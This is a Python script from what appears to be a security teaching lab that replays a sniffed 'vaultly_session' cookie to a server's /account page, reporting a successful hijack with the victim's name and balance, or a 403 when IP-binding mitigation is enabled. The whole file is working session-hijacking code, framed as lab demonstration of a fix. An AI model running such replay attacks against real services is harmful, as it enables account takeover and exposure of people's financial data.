#!/usr/bin/env python3
"""
replay.py — replay the stolen session cookie to impersonate the victim.

Runs on the ATTACKER (Kali). Takes the captured vaultly_session token and
sends it to the server's /account page. The attacker NEVER decrypts the
token — it is a bearer token, so merely holding it is enough. The server
decrypts it, sees a valid session, and serves the victim's account.

In --secure mode the server binds the token to the victim's IP, so this
replay from the attacker's IP is rejected (HTTP 403). That is the fix.

LAB USE ONLY.

    python3 replay.py --server 192.168.56.10 --port 5000            # insecure (http)
    python3 replay.py --server 192.168.56.10 --port 5000 --https    # secure  (https)
"""
import argparse
import re
import sys

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--server", required=True, help="server IP (ApexGP)")
    ap.add_argument("--port", type=int, default=5000)
    ap.add_argument("--https", action="store_true", help="use when server is in --secure mode")
    ap.add_argument("--cookie-file", default="stolen_cookie.txt")
    args = ap.parse_args()

    try:
        token = open(args.cookie_file).read().strip()
    except FileNotFoundError:
        print(f"[!] {args.cookie_file} not found — run sniff_cookie.py first.")
        sys.exit(1)

    scheme = "https" if args.https else "http"
    url = f"{scheme}://{args.server}:{args.port}/account"
    print(f"[*] replaying stolen cookie to {url}")
    print(f"[*] (attacker does NOT know the key — just resending the blob)")

    r = requests.get(url, cookies={"vaultly_session": token},
                     verify=False, allow_redirects=False)

    if r.status_code == 200 and "Signed in as" in r.text:
        name = re.search(r"Signed in as <strong>(.*?)</strong>", r.text)
        bal = re.search(r'balance-value">(.*?)<', r.text)
        print("\n[!!!] HIJACK SUCCESSFUL — logged in as the victim")
        print(f"      user   : {name.group(1) if name else '?'}")
        print(f"      balance: {bal.group(1) if bal else '?'}")
    elif r.status_code == 403:
        print("\n[---] HIJACK BLOCKED (HTTP 403)")
        print("      The server bound the session to the victim's IP.")
        print("      A replayed token from the attacker's IP is rejected. Mitigation works.")
    else:
        print(f"\n[?] unexpected response: HTTP {r.status_code}")


if __name__ == "__main__":
    main()
